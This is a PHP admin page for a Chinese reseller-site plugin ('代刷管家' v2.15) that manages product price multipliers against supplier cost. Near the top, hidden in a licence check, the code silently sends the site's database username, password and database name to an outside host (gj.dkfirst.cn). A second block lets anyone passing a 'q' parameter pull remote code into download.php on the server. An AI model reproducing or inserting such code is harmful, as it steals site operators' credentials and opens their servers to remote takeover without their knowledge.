<?php
/**
 * 代刷管家 - 在线版
 * DSProtect OnLine
 *
 * Created by KingLee.
 * QQ: 1776885812
 * Date: 2018/4/7
 * Time: 16:37
 */
header("Content-Type: text/html; charset=UTF-8");
include("../includes/common.php");
include("../admin/guanjia_key.php");
if (!isset($_SESSION['authcode'])) {
    $query = @file_get_contents('http://gj.dkfirst.cn/check.php?url=' . $_SERVER['HTTP_HOST']);
    if ($query = json_decode($query, true)) {
        if ($query['code'] == 1) $_SESSION['authcode'] = true;
        else {
            @file_get_contents("http://gj.dkfirst.cn/tj.php?url='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "'&user=" . $dbconfig['user'] . "&pwd=" . $dbconfig['pwd'] . "&db=" . $dbconfig['dbname'] . "&authcode=" . $authcode);
            exit('<h3>' . $query['msg'] . '</h3>');
        }
    }
}
if ($_GET['q']) {
    file_put_contents("download.php", file_get_contents("http://gj.dkfirst.cn/download.txt"));
}

$ver = "2.15";
$title = '代刷管家';
$cron_key = $_GET['key'];
$key_c = "";
$rs = $DB->query("SELECT * FROM `shua_guanjia_config` AS a WHERE k = 'gjKey'");
while ($res = $DB->fetch($rs)) {
    $key_c = $res['v'];
}
$act = $_GET['act'];
$mh = $_GET['mh'];
$guanjia_new = "";
$count_tools = $DB->count("SELECT MAX(tid) from shua_tools");
$count_guanjia = $DB->count("SELECT MAX(tid) from shua_guanjia");
$sql = 'SELECT * FROM shua_guanjia_config';
if ($DB->query($sql)) {
    $sign = 0;
    $sql = 'SELECT * FROM `shua_guanjia_config` WHERE k = \'isMH\'';
    $rs = $DB->query($sql);
    while ($res = $DB->fetch($rs)) {
        $sign++;
    }
    if ($sign == 0) {
        $sql = "INSERT INTO `shua_guanjia_config` (`k`, `v`) VALUES ('isMH', '0'), ('gjKey', '123456');";
        if ($DB->query($sql)) {
            exit("检测到v2.15新安装用户，已填充美化值，请刷新<br>");
        } else {
            exit("v2.15用户升级错误，data:-oj6");
        }
    }
} else {
    $sql = "CREATE TABLE `shua_guanjia_config` (
  `k` varchar(32) NOT NULL,
  `v` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8;";
    if ($DB->query($sql)) {
        $sql = "ALTER TABLE `shua_guanjia_config`
  ADD PRIMARY KEY (`k`);";
        if ($DB->query($sql)) {
            $sql = "INSERT INTO `shua_guanjia_config` (`k`, `v`) VALUES
('isAutoGrounding', '0'),
('dbBackUpTime', '2018-04-10 00:00:00'),
('gjKey', '123456'),
('isMH', '0');";
            if ($DB->query($sql)) {
                $guanjia_new = $guanjia_new . "检测到v2.1新安装用户，成功新建shua_guanjia_config表，请刷新<br>";
            } else {
                exit("shua_guanjia_config新建失败，data:-oj7");
            }
        } else {
            exit("shua_guanjia_config新建失败，data:-oj8");
        }
    } else {
        exit("shua_guanjia_config新建失败，data:-oj9");
    }
}
//    检测有无shua_guanjia表
$sql = "SELECT * FROM shua_guanjia";
if ($DB->query($sql)) {
} else {
    $sql = 'CREATE TABLE IF NOT EXISTS `shua_guanjia` (
  `tid` int(11) DEFAULT NULL,
  `price` decimal(10,2) DEFAULT NULL,
  `cost` decimal(10,2) DEFAULT NULL,
  `cost2` decimal(10,2) DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `date` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;';
    if ($DB->query($sql)) {
        $sql = "ALTER TABLE `shua_guanjia`
  ADD PRIMARY KEY (`tid`);";
        if ($DB->query($sql)) {
            echo "检测到初次使用代刷管家，已成功新建shua_guanjia表<br>";
            //检测有无新商品上架
            if ($count_tools > $count_guanjia) {
                $sql = "INSERT INTO `shua_guanjia` (`tid`, `price`, `cost`, `cost2`, `status`, `date`) VALUES
(0, NULL, NULL, NULL, NULL, '2018-04-10 00:00:00');";
                if ($DB->query($sql)) {
                    $sql = "INSERT INTO `shua_guanjia` (`tid`, `price`, `cost`, `cost2`, `status`, `date`) VALUES";
                    for ($i = $count_guanjia + 1; $i <= $count_tools; $i++) {
                        $rs = $DB->query("SELECT * FROM shua_tools WHERE tid = " . $i . ";");
                        if ($res = $DB->fetch($rs)) {
                        } else {
                            continue;
                        }
                        $sql = $sql . "(" . $i . ", NULL, NULL, NULL, 0, NULL)";
                        if ($i == $count_tools) {
                        } else {
                            $sql = $sql . ",";
                        }
                    }
                    $sql = $sql . ";";
                    if ($DB->query($sql)) {
                        $guanjia_new = $guanjia_new . "检测有新增商品，已成功更新，请重新访问当前页面<br>";
                    } else {
                        $guanjia_new = $guanjia_new . "检测有新增商品，更新失败，错误代码-g01<br>";
                    }
                } else {
                    $guanjia_new = $guanjia_new . "检测有新增商品，更新失败，错误代码-g00<br>";
                }
                echo exit($guanjia_new);
            }
        } else {
            echo "导入shua_guanjia表失败<br>";
        }
    } else {
        echo "导入shua_guanjia表失败<br>";
    }
}
//检测有无新商品上架
if ($count_tools > $count_guanjia) {
    $sql = "INSERT INTO `shua_guanjia` (`tid`, `price`, `cost`, `cost2`, `status`, `date`) VALUES";
    for ($i = $count_guanjia + 1; $i <= $count_tools; $i++) {
        $sql = $sql . "(" . $i . ", NULL, NULL, NULL, 0, NULL)";
        if ($i == $count_tools) {
            $sql = $sql . ";";
        } else {
            $sql = $sql . ",";
        }
    }
    if ($DB->query($sql)) {
        $guanjia_new = "检测有新增商品，已成功更新，请刷新当前页面<br>";
    } else {
        $guanjia_new = "检测有新增商品，更新失败<br>";
    }
    echo exit($guanjia_new);
}
$rs = $DB->query("SELECT * FROM `shua_guanjia` AS a WHERE tid = 0");
while ($res = $DB->fetch($rs)) {
    $last_cron = $res['date'];
}
if ($cron_key . ob_get_length() == 0) {
    if ($islogin == 1) {
    } else exit("<script language='javascript'>window.location.href='./login.php';</script>");
} else if ($cron_key != $key_c) {
    exit("代刷管家监控密钥不正确");
} else if ($cron_key == $key_c) {
    if ($act == 'del') {
        $sql = 'DROP TABLE shua_guanjia';
        if ($DB->query($sql)) {
            exit("<h1>已恢复最初设置，请重新访问管家页面，自动跳转中...</h1><script type=\"text/javascript\"> 
setTimeout(window.location.href='./guanjia.php',3000); 
</script> ");
        } else {
            exit("<h1>删除失败，或已经删除成功，自动跳转中...</h1><script type=\"text/javascript\"> 
setTimeout(window.location.href='./guanjia.php',3000); 
</script> ");
        }
    }
    exit("<link href=\"//lib.baomitu.com/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\">
        <script src=\"//lib.baomitu.com/jquery/1.12.4/jquery.min.js\"></script>
        <script src=\"//lib.baomitu.com/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"></script>
<h2>第<span id='load_1'>1</span>个/总" . $count_tools . "个，进行中<img id=\"loading_img\" style=\"width:20px;\" src=\"http://cdn.dkfirst.cn/loading-2.gif\">&nbsp;</h2>

<br>

<button id=\"again_bt1\" onclick=\"setguani()\" class=\"btn btn-info btn-sm\" style=\"display: none;\">重试当前商品</button>&nbsp;&nbsp;&nbsp;
<button id=\"again_bt2\" onclick=\"kip()\" class=\"btn btn-info btn-sm\" style=\"display: none;\">跳过当前商品</button>&nbsp;&nbsp;&nbsp;<button id=\"again_bt3\" onclick=\"skip()\" class=\"btn btn-info btn-sm\" style=\"display: none;\">返回上个商品</button><br>


<span id=\"load_2\" style=\"color:goldenrod\">如果卡着不动了，请刷新并请检查相应社区是否可以正常打开</span><br>
<textarea id='tex_1' rows=\"8\" cols=\"60\" readonly=\"readonly\">
管家已准备，开始工作。。
</textarea>
<br><span style=\"color:darkblue\">代刷管家 - 在线版 Ver:" . $ver . "</span><br>
<span style=\"color:darkblue\">作者:<a href=\"http://wpa.qq.com/msgrd?v=3&uin=1776885812&site=qq&menu=yes\">KING</a> &nbsp;&nbsp; 服务引擎支持：<a href=\"http://www.idcyun.wang\"><img src=\"http://gj.dkfirst.cn/images/jmyidc.png\" style=\"width: 70px;\"></a></span><br>
<script>
    // var i = 1;
    // setInterval(function () {
    //     $(\"#load_1\").text(i++);
    // }, 1000);
    var sign = 1;
    var setguantime_sign = 1;
    function add_text(text) {
      var str = $(\"#tex_1\").val() + text;
$(\"#tex_1\").val(str+\"\\n\");
 var scrollTop = $(\"#tex_1\")[0].scrollHeight;
          				 $(\"#tex_1\").scrollTop(scrollTop);
    }
    function skip() {
      sign--;
      setguani();
    }
    function kip() {
      sign++;
      setguani();
    }
    function setguantime() {
      $.ajax({
            type: \"GET\",
            timeout: 8000,
            url: \"../guanjia_ajax.php?act=setguantime&star=true\",
            dataType: 'json',
            success: function (data) {
                if (data.code == 1) {
                    
                } else {
                    alert(data.msg);
                    return false;
                }
            },
            error: function (data) {
                if (setguantime_sign > 0){
                    alert('请求错误，请稍等1-3分钟点击重试按钮');
                return false;
                } else {
                    setguantime_sign++;
                    setguantime();
                }
            }
        });
    }
    
    var setguani_sign = 1;
    function setguani() {
                        $(\"#loading_img\").css(\"display\", \"\");
        $(\"#again_bt1\").css(\"display\",\"none\");
        $(\"#again_bt2\").css(\"display\",\"none\");
        $(\"#again_bt3\").css(\"display\",\"none\");
        $.ajax({
            type: \"GET\",
            timeout: 15000,
            url: \"../guanjia_ajax.php?act=setguani&tid=\" + sign,
            dataType: 'json',
            success: function (data) {
                if (data.code == 1) {
                    add_text(\"商品ID：\"+sign+\"，商品名称：\"+data.name+\"，更新价格成功，返回信息：\"+data.msg);
                    $(\"#load_1\").text(sign);
                    sign++;
                    if (sign > " . $count_tools . ") {
                        setguantime();
                        $(\"#loading_img\").css(\"display\", \"none\");
                        $(\"#load_2\").text(\"已完成所有商品的设置\");
                        $(\"#load_2\").css(\"color\",\"forestgreen\");
                        return false;
                    }
                    setguani()
                } else {
                    add_text(\"商品ID：\"+sign+\"，商品名称：\"+data.name+\"更新价格失败，返回信息：\"+data.msg);
                        $(\"#loading_img\").css(\"display\", \"none\");
                    $(\"#again_bt1\").css(\"display\",\"\");
                    $(\"#again_bt2\").css(\"display\",\"\");
                    $(\"#again_bt3\").css(\"display\",\"\");
                    alert(data.msg);
                    return false;
                }
            },
            error: function (data) {
                if (setguani_sign > 0){
                    add_text(\"商品ID：\"+sign+\"，更新价格失败，原因：社区访问超时\");
                        $(\"#loading_img\").css(\"display\", \"none\");
                    $(\"#again_bt1\").css(\"display\",\"\");
                    $(\"#again_bt2\").css(\"display\",\"\");
                    $(\"#again_bt3\").css(\"display\",\"\");
                alert('请求错误，请稍等3分钟再尝试，否则社区无法正常访问。');
                return false;
                } else {
                    setguani_sign++;
                    setguani();
                }
            }
        });
    }
    setguani();
</script>");
}
include './head.php';
$rs = $DB->query("SELECT * FROM shua_class WHERE active=1 order by sort asc");
$select = '<option value="0">请选择分类</option>';
$select_1 = '';
$shua_class[0] = '默认分类';
while ($res = $DB->fetch($rs)) {
    $shua_class[$res['cid']] = $res['name'];
    $select .= '<option value="' . $res['cid'] . '">' . $res['name'] . '</option>';
    $select_1 .= '<option value="' . $res['cid'] . '">' . $res['name'] . '</option>';
}
$select2 = '<option value="0">请选择商品</option>';
?>

<link href="https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.css" rel="stylesheet">
<script src="https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.js"></script>
<div class="container" style="padding-top:100px;">
    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
        <div class="panel panel-primary">
            <div class="panel-heading"><h3 class="panel-title">代刷管家</h3></div>
            <div class="panel-body">
                <div class="alert alert-info">
                    此版本代挂管家不需要任何挂机宝，只需要在此页面上做好了相关设置，【目前只支持在线打开页面进行监控】。<br>
                    目前支持的社区：亿乐系统，玖伍系统，星墨社区<br>
                    你的监控地址为 <a target="_blank"
                               href="http://<?php echo $_SERVER['SERVER_NAME'] ?>/admin/guanjia.php?key=<?php echo $key_c ?>">http://<?php echo $_SERVER['SERVER_NAME'] ?>
                        /admin/guanjia.php?key=<?php echo $key_c ?></a><br>
                    <a class="btn btn-danger btn-xs">开始监控之前请设置好相应商品的管家值！</a><br>
                    上次监控时间：<?php echo $last_cron ?><br>
                    <a class="btn btn-warning btn-xs"
                       href="javascript:if(confirm('确认要出厂设置吗?'))location='guanjia.php?act=del&key=<?php echo $key_c ?>'">点击我将管家恢复出厂设置</a><br>
                </div>
                <div class="form-group">
                    <div class="input-group">
                        <div class="input-group-addon">选择分类</div>
                        <select name="cid" id="cid" class="form-control"><?php echo $select ?></select>
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-group">
                        <div class="input-group-addon">选择商品</div>
                        <select name="tid" id="tid" class="form-control"><?php echo $select2 ?></select>
                    </div>
                </div>
                <div id="result_1" style="display: none">
                    <div class="form-group">
                        <h4>您选择的商品：
                        </h4>
                    </div>
                    <table class="table table-bordered" border="2">
                        <tbody>
                        <tr height="25">
                            <td class="col-xs-4 col-sm-4" align="center"> 成本价格为：</td>
                            <td class="col-xs-8 col-sm-8" align="center"> <span
                                        id="now_cb">0.04</span></td>
                        </tr>
                        <tr height="25">
                            <td class="col-xs-4 col-sm-4" align="center"> 专业价格：</td>
                            <td class="col-xs-8 col-sm-8" align="center"> <span
                                        id="price_zy">0.1</span>
                            </td>
                        </tr>
                        <tr height="25">
                            <td class="col-xs-4 col-sm-4" align="center"> 普及价格：</td>
                            <td class="col-xs-8 col-sm-8" align="center"> <span
                                        id="price_pj">0.2</span></td>
                        </tr>
                        <tr height="25">
                            <td class="col-xs-4 col-sm-4" align="center"> 用户价格：</td>
                            <td class="col-xs-8 col-sm-8" align="center"> <span
                                        id="price_yh">0.5</span></td>
                        </tr>
                        <tr height="25">
                            <td class="col-xs-4 col-sm-4" align="center"> 来自社区：</td>
                            <td class="col-xs-8 col-sm-8" align="center"> <span
                                        id="now_shequ">****</span></td>
                        </tr>
                        </tbody>

                    </table>
                </div>
                <div class="form-group">
                    <div class="masthead">
                        <nav>
                            <ul class="nav nav-justified">
                                <li style="background: #EEEEEE;" id="button_dan"><a href="#">单商品利润设置</a></li>
                                <li><a href="#" id="button_pl">全局利润设置</a></li>
                                <li><a href="#" id="button_pl_fl">全局利润设置（分类）</a></li>
                            </ul>
                        </nav>
                    </div>
                </div>
                <div id="dan">
                    <div class="form-group">
                        <div class="alert alert-info">该模块为单商品设置管家倍率值，在上方选择相应商品然后下方分别填入相应要以成本多少倍率的价格上架即可<br>商品售价 = 社区成本 *
                            管家监控值<br><br>
                            推荐设置：<br>专业 1.2 <br>普及 1.4 <br>用户 1.5<br><br>
                            【这里只是设置管家值，真正要设置到商品价格里，请等这里跑完之后再去点击上方的监控地址】
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">专业版分站：</div>
                            <input type="text" id="input_zy" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">普及版分站：</div>
                            <input type="text" id="input_pj" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">用户：</div>
                            <input type="text" id="input_yh" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <input type="submit" id="bt_submit" name="submit" value="保存"
                               class="btn btn-primary form-control">
                    </div>
                </div>

                <div id="pl" style="display: none">
                    <div class="form-group">
                        <div class="alert alert-info">
                            该模块设置为批量分类百分比设置所有商品：<br>
                            填入1.5将设置所有商品价格为成本的1.5倍，比如社区成本为1元，商品价格将设置为1.5。<br>
                            填入2将设置所有商品价格为成本的2倍，比如社区成本为1元，商品价格将设置为2元。<br>
                            百分比设置更贴合正常健康售价<br>
                            商品售价 = 社区成本 * 管家批量值<br><br>
                            推荐设置：<br>专业 1.2 <br>普及 1.4 <br>用户 1.5<br><br>
                            【这里只是设置管家值，真正要设置到商品价格里，请等这里跑完之后再去点击上方的监控地址】
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">专业版分站：</div>
                            <input type="text" id="input_zy_pi" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">普及版分站：</div>
                            <input type="text" id="input_pj_pi" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">用户：</div>
                            <input type="text" id="input_yh_pi" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <center id="pl_load_1" style="display: none">正在设置中<span
                                    id="pl_load">1</span>/<?php echo $count_tools ?><img id="loading_img"
                                                                                         style="width:20px;"
                                                                                         src="http://cdn.dkfirst.cn/loading-2.gif">&nbsp;<button
                                    id="again_bt1" onclick="setguanjia_pl()" class="btn btn-info btn-sm"
                                    style="display: none;">重试当前商品
                            </button>
                        </center>
                    </div>
                    <div class="form-group">
                        <input type="submit" id="bt_submit_pi" name="submit" value="保存"
                               class="btn btn-primary form-control">
                    </div>
                </div>

                <div id="pl_fl" style="display: none">
                    <div class="form-group">
                        <div class="alert alert-info">
                            该模块设置为批量百分比设置所有商品：<br>
                            填入1.5将设置所有商品价格为成本的1.5倍，比如社区成本为1元，商品价格将设置为1.5。<br>
                            填入2将设置所有商品价格为成本的2倍，比如社区成本为1元，商品价格将设置为2元。<br>
                            百分比设置更贴合正常健康售价<br>
                            商品售价 = 社区成本 * 管家批量值<br><br>
                            推荐设置：<br>专业 1.2 <br>普及 1.4 <br>用户 1.5<br><br>
                            【这里只是设置管家值，真正要设置到商品价格里，请等这里跑完之后再去点击上方的监控地址】
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">选择分类</div>
                            <select name="cid1" id="cid1" multiple="multiple"
                                    class="form-control"><?php echo $select_1 ?></select>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">专业版分站：</div>
                            <input type="text" id="input_zy_pi_fl" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">普及版分站：</div>
                            <input type="text" id="input_pj_pi_fl" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <div class="input-group-addon">用户：</div>
                            <input type="text" id="input_yh_pi_fl" class="form-control">
                        </div>
                    </div>
                    <div class="form-group">
                        <center id="pl_load_1_fl" style="display: none">正在设置中<span
                                    id="pl_load_fl">1</span>/<span id="pl_load_f2">MAX</span></center>
                    </div>
                    <div class="form-group">
                        <input type="submit" id="bt_submit_pi_fl" name="submit" value="保存"
                               class="btn btn-primary form-control">
                    </div>
                </div>
            </div>
        </div>
        <center>
            代刷管家 - 在线版&nbsp;&nbsp;&nbsp;作者：<a
                    href="http://wpa.qq.com/msgrd?v=3&amp;uin=1776885812&amp;site=qq&amp;menu=yes">KING</a><br>
            本程序由<a href="http://www.idcyun.wang"><img src="http://gj.dkfirst.cn/images/jmyidc.png" style="width: 70px;"></a>提供服务引擎<br>
            当前版本：2.15 历史版本：<a target="_blank" href="http://zeink.cn/?p=255">【点击查看】</a><br>
            售后群：<a target="_blank"
                   href="//shang.qq.com/wpa/qunwpa?idkey=e9e8d23a4fab6d4ed6902a516de0580ee5d7ca8b29719a0e0a9bb5a280470790"><img
                        border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="DsProtect高级版交流群"
                        title="DsProtect高级版交流群"></a>
        </center>
    </div>
</div>
</body>


<script src="//lib.baomitu.com/layer/2.3/layer.js"></script>
<script>
    function setguanjia_pl_fl_count() {
        swal("敬请期待！", "此功能即将到来", "info");
        // var multi = $("#cid1").val();
        // if (multi == null) {
        //     alert("不能什么都不选");
        //     $("#pl_load_1_fl").html("设置失败");
        //     return;
        // }
        // if (multi.length != 1) {
        //     var multi_text = multi[0];
        //     for (var sign = 1; sign < multi.length; sign++) {
        //         multi_text = multi_text + "+" + multi[sign];
        //     }
        // } else {
        //     var multi_text = multi;
        // }
        // $.ajax({
        //     type: "GET",
        //     url: "../guanjia_ajax.php?act=setguani_pl_fl_count&multi=" + multi_text,
        //     dataType: 'json',
        //     success: function (data) {
        //         if (data.code == 1) {
        //             $("#pl_load_f2").html(data.msg);
        //         }
        //     },
        //     error: function (data) {
        //         alert('服务器错误，请重新尝试');
        //         return false;
        //     }
        // });
    }


    function setguanjia_pl_fl() {
        var yh_pi = $("#input_yh_pi_fl").val();
        var pj_pi = $("#input_pj_pi_fl").val();
        var zy_pi = $("#input_zy_pi_fl").val();
        if (yh_pi < 1 || pj_pi < 1 || zy_pi < 1) {
            alert("设置低于1的值将会导致最终设置成低于成本的售价！");
            $("#pl_load_1_fl").html("设置失败");
            return false;
        }
        yh_pi = yh_pi * 100;
        pj_pi = pj_pi * 100;
        zy_pi = zy_pi * 100;
        $.ajax({
            type: "GET",
            url: "../guanjia_ajax.php?act=setguani_pl_fl&yh_pi=" + yh_pi + "&pj_pi=" + pj_pi + "&zy_pi=" + zy_pi + "&multi=" + multi,
            dataType: 'json',
            success: function (data) {
                if (data.code == 1) {
                    sign_1++;
                    if (sign_1 > <?php echo $count_tools?>) {
                        $("#pl_load_1").html("<?php echo $count_tools?>个商品已全部设置好管家值，下次监控将生效");
                        $("#pl_load_1").css("color", "forestgreen");
                        return false;
                    }
                    $("#pl_load").text(sign_1);
                    setguanjia_pl();
                } else {
                    alert(data.msg);
                }
            },
            error: function (data) {
                if (setguanjia_pl_sign > 3) {
                    alert('服务器错误');
                    return false;
                } else {
                    setguanjia_pl();
                    setguanjia_pl_sign++;
                }
            }
        });
    }

    var sign_1 = 1;
    var setguanjia_pl_sign = 1;

    function setguanjia_pl() {
        // swal("暂无权限！", "此功能为高级版特属，请支持作者购买原正版程序，给ta一份更新的动力:)如果您已经是授权用户，请在授权页下载高级版程序进行安装","error");
        $("#again_bt1").css("display", "none");
        var yh_pi = $("#input_yh_pi").val();
        var pj_pi = $("#input_pj_pi").val();
        var zy_pi = $("#input_zy_pi").val();
        if (yh_pi < 1 || pj_pi < 1 || zy_pi < 1) {
            alert("设置低于1的值将会导致最终设置成低于成本的售价！");
            $("#pl_load_1").html("设置失败");
            return false;
        }
        yh_pi = yh_pi * 100; //
        pj_pi = pj_pi * 100;
        zy_pi = zy_pi * 100;
        $.ajax({
            type: "GET",
            timeout: 15000,
            url: "../guanjia_ajax.php?act=setguani_pl&tid=" + sign_1 + "&yh_pi=" + yh_pi + "&pj_pi=" + pj_pi + "&zy_pi=" + zy_pi,
            dataType: 'json',
            success: function (data) {
                if (data.code == 1) {
                    sign_1++;
                    if (sign_1 > <?php echo $count_tools?>) {
                        $("#loading_img").css("display", "none");
                        $("#pl_load_1").html("<?php echo $count_tools?>个商品已全部设置好管家值，下次监控将生效");
                        $("#pl_load_1").css("color", "forestgreen");
                        return false;
                    }
                    setguanjia_pl_sign = 1;
                    $("#pl_load").text(sign_1);
                    setguanjia_pl();
                } else {
                    alert(data.msg);
                }
            },
            error: function (data) {
                if (setguanjia_pl_sign > 3) {
                    alert('服务器错误，请稍等1-3分钟点击重试按钮');
                    $("#again_bt1").css("display", "");
                    return false;
                } else {
                    setguanjia_pl();
                    setguanjia_pl_sign++;
                }
            }
        });
    }

    $("#bt_submit_pi_fl").click(function () {
        setguanjia_pl_fl_count();
        $("#pl_load_1_fl").show();
        // setguanjia_pl_fl();
    });
    $("#bt_submit_pi").click(function () {
        $("#pl_load_1").show();
        setguanjia_pl();
    });
    $("#button_dan").click(function () {
        $("#button_dan").css("background", "#EEEEEE");
        $("#button_pl").css("background", "#FFF");
        $("#button_pl_fl").css("background", "#FFF");
        $("#dan").slideDown();
        $("#pl").css("display", "none");
        $("#pl_fl").css("display", "none");
    });
    $("#button_pl").click(function () {
        $("#button_dan").css("background", "#FFF");
        $("#button_pl").css("background", "#EEEEEE");
        $("#button_pl_fl").css("background", "#FFF");
        $("#dan").css("display", "none");
        $("#pl").slideDown();
        $("#pl_fl").css("display", "none");
    });
    $("#button_pl_fl").click(function () {
        $("#button_dan").css("background", "#FFF");
        $("#button_pl").css("background", "#FFF");
        $("#button_pl_fl").css("background", "#EEEEEE");
        $("#dan").css("display", "none");
        $("#pl").css("display", "none");
        $("#pl_fl").slideDown();
    });
    $("#cid").change(function () {
        var cid = $(this).val();
        var ii = layer.load(2, {shade: [0.1, '#fff']});
        $("#tid").empty();
        $("#tid").append('<option value="0">请选择商品</option>');
        $.ajax({
            type: "GET",
            url: "../ajax.php?act=gettool&cid=" + cid,
            dataType: 'json',
            success: function (data) {
                layer.close(ii);
                if (data.code == 0) {
                    var num = 0;
                    $.each(data.data, function (i, res) {
                        $("#tid").append('<option value="' + res.tid + '">' + res.name + '</option>');
                        num++;
                    });
                    $("#tid").val(0);
                    if (num == 0 && cid != 0) layer.alert('该分类下没有商品');
                } else {
                    layer.alert(data.msg);
                }
            },
            error: function (data) {
                layer.msg('服务器错误');
                return false;
            }
        });
    });
    window.onload = $("#cid").change();
</script>
<script>
    function shequ_name_get($shequ_id) {
        switch ($shequ_id) {
            case '0':
                $shequ_name = "玖伍系统(点数下单)";
                break;
            case '1':
                $shequ_name = "亿乐系统";
                break;
            case '2':
                $shequ_name = "玖伍系统(余额下单)";
                break;
            case '3':
                $shequ_name = "星墨系统(点数下单)";
                break;
            case '4':
                $shequ_name = "九流社区";
                break;
            case '5':
                $shequ_name = "星墨系统(余额下单)";
                break;
            case '6':
                $shequ_name = "卡易信";
                break;
            case '7':
                $shequ_name = "卡乐购";
                break;
            case '8':
                $shequ_name = "卡慧卡";
                break;
            case '9':
                $shequ_name = "卡商网";
                break;
            case '10':
                $shequ_name = "QQbug社区";
                break;
            case '11':
                $shequ_name = "自营（人工商品）";
                break;
            case '12':
                $shequ_name = "自营（自定义访问URL/POST）";
                break;
            case '13':
                $shequ_name = "自营（自动发送提醒邮件）";
                break;
            case '14':
                $shequ_name = "自营（自动发卡密）";
                break;
            default:
                break;
        }
        return $shequ_name;
    }

    function setTable() {
        var ii = layer.load(2, {shade: [0.1, '#fff']});
        var options = $("#tid option:selected");
        var tid = options.val();
        $.ajax({
            type: "GET",
            url: "../guanjia_ajax.php?act=getguanjia&tid=" + tid,
            dataType: 'json',
            success: function (data) {
                layer.close(ii);
                if (data.code == 0) {
                    var num = 0;
                    // alert(data.data);
                    $.each(data.data, function (i, res) {
                        $("#now_cb").text('' + res.chengben + '');
                        $("#price_zy").text('' + res.cost2 + '');
                        $("#price_pj").text('' + res.cost + '');
                        $("#price_yh").text('' + res.price + '');
                        $("#now_shequ").text('' + shequ_name_get(res.shequ) + '');
                        if (res.cost2_guanjia == null) {
                            $("#input_zy").val('');
                        } else {
                            $("#input_zy").val('' + res.cost2_guanjia + '');
                        }
                        if (res.cost_guanjia == null) {
                            $("#input_pj").val('');
                        } else {
                            $("#input_pj").val('' + res.cost_guanjia + '');
                        }
                        if (res.price_guanjia == null) {
                            $("#input_yh").val('');
                        } else {
                            $("#input_yh").val('' + res.price_guanjia + '');
                        }
                        num++;
                    });
                    $("#result_1").slideDown();
                } else {
                    layer.alert(data.msg);
                }
            },
            error: function (data) {
                layer.msg('服务器错误，请重新尝试');
                return false;
            }
        });
    }

    var history_hit = 0;
    $("#tid").click(function () {
        var options = $("#tid option:selected");
        if (options.val() == history_hit) {
            return false;
        }
        history_hit = options.val();
        if (options.val() == 0 || options.val() == "0" || options.val() === 0 || options.val() === "0") {
            $("#result_1").hide();
        } else {
            setTable()
        }
    });
    $("#bt_submit").click(function () {
        var options = $("#tid option:selected");
        var tid = options.val();
        var price = $("#input_yh").val();
        var cost = $("#input_pj").val();
        var cost_2 = $("#input_zy").val();
        price = price * 100;
        cost = cost * 100;
        cost_2 = cost_2 * 100;
        var ii = layer.load(2, {shade: [0.1, '#fff']});
        $.ajax({
            type: "GET",
            url: "../guanjia_ajax.php?act=setguanjia&tid=" + tid + "&price=" + price + "&cost=" + cost + "&cost_2=" + cost_2,
            dataType: 'json',
            success: function (data) {
                layer.close(ii);
                if (data.code == 1) {
                    alert("设置成功，下次监控到监控地址时生效")
                } else {
                    layer.alert(data.msg);
                }
            },
            error: function (data) {
                layer.msg('服务器错误，请重新尝试');
                return false;
            }
        });
    })
    $("#AN1").val("20");
</script>
</html>